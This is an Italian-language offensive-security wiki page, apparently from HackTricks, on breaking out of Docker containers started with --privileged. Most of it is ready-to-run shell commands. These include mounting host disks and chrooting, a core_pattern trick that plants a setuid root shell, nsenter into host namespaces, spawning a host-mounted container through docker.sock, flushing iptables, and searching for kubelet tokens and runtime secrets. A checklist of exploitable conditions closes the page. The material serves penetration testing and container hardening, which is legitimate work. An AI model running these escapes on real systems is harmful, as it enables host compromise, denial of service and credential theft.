# Uscire da Container `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un container avviato con `--privileged` non è la stessa cosa di un container normale con una o due autorizzazioni aggiuntive. In pratica, `--privileged` rimuove o indebolisce diverse protezioni predefinite del runtime che normalmente tengono il workload lontano da risorse pericolose dell'host. L'effetto esatto dipende comunque dal runtime e dall'host, ma con Docker il risultato tipico è:

- vengono concesse tutte le capabilities
- le restrizioni del device cgroup vengono rimosse
- molti filesystem del kernel non vengono più montati in sola lettura
- i percorsi predefiniti mascherati di procfs scompaiono
- il filtering seccomp viene disabilitato
- il confinement AppArmor viene disabilitato
- l'isolamento SELinux viene disabilitato o sostituito con un label molto più permissivo

La conseguenza importante è che un container privilegiato di solito **non** necessita di un sottile kernel exploit. In molti casi può semplicemente interagire direttamente con i device dell'host, con i filesystem del kernel accessibili dall'host o con le interfacce del runtime, per poi effettuare un pivot verso una shell dell'host.

## Cosa `--privileged` Non Modifica Automaticamente

`--privileged` **non** entra automaticamente nei namespace PID, network, IPC o UTS dell'host. Un container privilegiato può continuare ad avere namespace privati. Ciò significa che alcune escape chain richiedono una condizione aggiuntiva, come:

- un bind mount dell'host
- la condivisione dei PID dell'host
- il networking dell'host
- device dell'host visibili
- interfacce proc/sys scrivibili

Queste condizioni sono spesso facili da soddisfare in caso di misconfiguration reali, ma sono concettualmente separate da `--privileged` stesso.

## Percorsi di Escape

### 1. Montare il Disco dell'Host Attraverso i Device Esposti

Un container privilegiato vede solitamente molti più device node sotto `/dev`. Se il block device dell'host è visibile, l'escape più semplice consiste nel montarlo ed eseguire `chroot` nel filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se la partizione root non è evidente, enumera prima la struttura dei blocchi:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se il percorso pratico consiste nel posizionare un helper setuid in un mount host scrivibile anziché usare `chroot`, ricorda che non tutti i filesystem rispettano il bit setuid. Un rapido controllo delle capacità lato host è:
```bash
mount | grep -v "nosuid"
```
Questo è utile perché i percorsi scrivibili nei filesystem `nosuid` sono molto meno interessanti per i workflow classici "deposita una shell setuid ed eseguila in seguito".

Le protezioni indebolite sfruttate qui sono:

- esposizione completa dei dispositivi
- capabilities estese, in particolare `CAP_SYS_ADMIN`

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montare o riutilizzare un bind mount dell'host ed eseguire `chroot`

Se il filesystem root dell'host è già montato all'interno del container, oppure se il container può creare i mount necessari perché è privileged, spesso per ottenere una shell dell'host basta un solo `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se non esiste alcun bind mount della root dell'host, ma lo storage dell'host è raggiungibile, creane uno:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Questo percorso sfrutta:

- restrizioni di mount indebolite
- capabilities complete
- assenza di confinamento MAC

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Sfruttare `/proc/sys` O `/sys` Scrivibili

Una delle principali conseguenze di `--privileged` è che le protezioni di procfs e sysfs diventano molto più deboli. Questo può esporre interfacce del kernel rivolte all'host che normalmente sono mascherate o montate in sola lettura.

Un esempio classico è `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Altri percorsi di alto valore includono:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Questo percorso sfrutta:

- masked paths mancanti
- system paths read-only mancanti

Pagine correlate:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usare Full Capabilities Per Un Escape Basato Su Mount O Namespace

Un container privilegiato ottiene le capabilities normalmente rimosse dai container standard, tra cui `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` e molte altre. Spesso questo è sufficiente per trasformare un foothold locale in un host escape non appena è presente un'altra superficie esposta.

Un semplice esempio consiste nel montare filesystem aggiuntivi e usare il namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se viene condiviso anche il PID dell'host, il passaggio diventa ancora più breve:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Questo percorso sfrutta:

- il set di capability privilegiate predefinito
- la condivisione opzionale del PID dell'host

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape attraverso i socket del runtime

Un container privilegiato finisce spesso per avere visibili lo stato o i socket del runtime dell'host. Se è possibile raggiungere un socket Docker, containerd o CRI-O, l'approccio più semplice consiste spesso nell'utilizzare l'API del runtime per avviare un secondo container con accesso all'host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Per containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Questo percorso sfrutta:

- esposizione del runtime privilegiato
- bind mount dell'host creati direttamente tramite il runtime

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Rimuovere gli effetti collaterali dell'isolamento di rete

`--privileged` non entra di per sé nel namespace di rete dell'host, ma se il container dispone anche di `--network=host` o di altro accesso alla rete dell'host, l'intero network stack diventa modificabile:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Questo non è sempre un accesso diretto alla shell dell'host, ma può consentire una denial of service, l'intercettazione del traffico o l'accesso a servizi di gestione accessibili solo tramite loopback.

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leggere i segreti dell'host e lo stato del runtime

Anche quando una clean shell escape non è immediatamente possibile, i container privilegiati spesso dispongono di accesso sufficiente per leggere i segreti dell'host, lo stato di kubelet, i metadati del runtime e i filesystem dei container vicini:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` è montato dall'host o le directory di runtime sono visibili, questo può essere sufficiente per il movimento laterale o il furto di credenziali cloud/Kubernetes, anche prima di ottenere una shell sull'host.

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Controlli

Lo scopo dei seguenti comandi è confermare quali famiglie di escape da container privilegiati siano immediatamente praticabili.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Cosa è interessante qui:

- un set completo di capabilities, in particolare `CAP_SYS_ADMIN`
- esposizione scrivibile di proc/sys
- dispositivi dell'host visibili
- assenza di seccomp e del confinamento MAC
- socket del runtime o bind mount della root dell'host

Una qualsiasi di queste condizioni può essere sufficiente per il post-exploitation. Diverse condizioni insieme di solito significano che il container è, di fatto, a uno o due comandi dalla compromissione dell'host.

## Pagine correlate

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
